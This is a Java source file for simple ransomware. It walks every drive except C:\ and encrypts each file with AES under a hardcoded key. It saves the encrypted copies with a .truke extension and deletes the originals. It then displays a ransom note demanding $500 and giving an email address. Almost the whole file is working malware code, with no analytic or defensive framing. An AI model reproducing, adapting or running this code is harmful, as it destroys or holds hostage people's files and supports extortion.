package encryment;
    
import java.io.*;
import java.nio.file.*;
import java.nio.file.attribute.*;
import static java.nio.file.FileVisitResult.*;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JOptionPane;
import javax.swing.filechooser.FileSystemView;

 public class Encryment {

public static class Finder extends SimpleFileVisitor<Path> {

    private final PathMatcher matcher;
    private int numMatches = 0;

    Finder(String pattern) {
        matcher = FileSystems.getDefault().getPathMatcher("glob:" + pattern);
    }

    // Compares the glob pattern against
    // the file or directory name.
    void find(Path file) {
        String key = "This is a secret";
        
       File f = new File(file+"");
        if (f.isFile()){   
            String m = f+"";
            if(!m.endsWith(".truke")){
            File encryptedFile = new File(f+".truke");
       try {
          fileProcessor(Cipher.ENCRYPT_MODE,key,f,encryptedFile);
        } catch (Exception ex) {
	     System.out.println(ex.getMessage());
	    } 
        }}
        else
            System.out.print("");
    }
    

    // Invoke the pattern matching
    // method on each file.
    @Override
    public FileVisitResult visitFile(Path file,
            BasicFileAttributes attrs) {
        find(file);
        return CONTINUE;
    }

    // Invoke the pattern matching
    // method on each directory.
    @Override
    public FileVisitResult preVisitDirectory(Path dir,
            BasicFileAttributes attrs) {
        find(dir);
        return CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file,IOException exc) {
    //System.err.println(exc);
        return CONTINUE;
    }
}

public static void main(String[] args)throws IOException {
    
    NewJFrame mr = new NewJFrame();
    mr.setVisible(true);

    File[] paths;
    FileSystemView fsv = FileSystemView.getFileSystemView();
    paths = File.listRoots();

    for (File path : paths) {
        String str = path.toString();
        if(str.equalsIgnoreCase("C:\\"))
            System.out.print("");
        else{
            String slash = "\\";
        
        String s = new StringBuilder(str).append(slash).toString();
        Path startingDir = Paths.get(s);
       String pattern = "*.";

        Finder finder = new Finder(pattern);
        Files.walkFileTree(startingDir, finder);
    }
        
}
    
    infoBox("Your files have been encrypted ...\n" +
            "If you want to retrieve it, you should pay $ 500 and email me on" +
            "\n" +
            "manar.k.matarya@gmail.com", "Warning");
        }

 static void fileProcessor(int cipherMode,String key,File inputFile,File outputFile){
	 try {
	       Key secretKey = new SecretKeySpec(key.getBytes(), "AES");
	       Cipher cipher = Cipher.getInstance("AES");
	       cipher.init(cipherMode, secretKey);

               FileOutputStream outputStream;
             try (FileInputStream inputStream = new FileInputStream(inputFile)) {
                 byte[] inputBytes = new byte[(int) inputFile.length()];
                 inputStream.read(inputBytes);
                 byte[] outputBytes = cipher.doFinal(inputBytes);
                 outputStream = new FileOutputStream(outputFile);
                 outputStream.write(outputBytes);
             }
	       outputStream.close();
               inputFile.delete();

	    } catch (NoSuchPaddingException | NoSuchAlgorithmException 
                     | InvalidKeyException | BadPaddingException
	             | IllegalBlockSizeException | IOException e) {
            }
     }
 
  public static void infoBox(String infoMessage, String titleBar)
    {
        JOptionPane.showMessageDialog(null, infoMessage, "InfoBox: " + titleBar, JOptionPane.INFORMATION_MESSAGE);
    }
 }
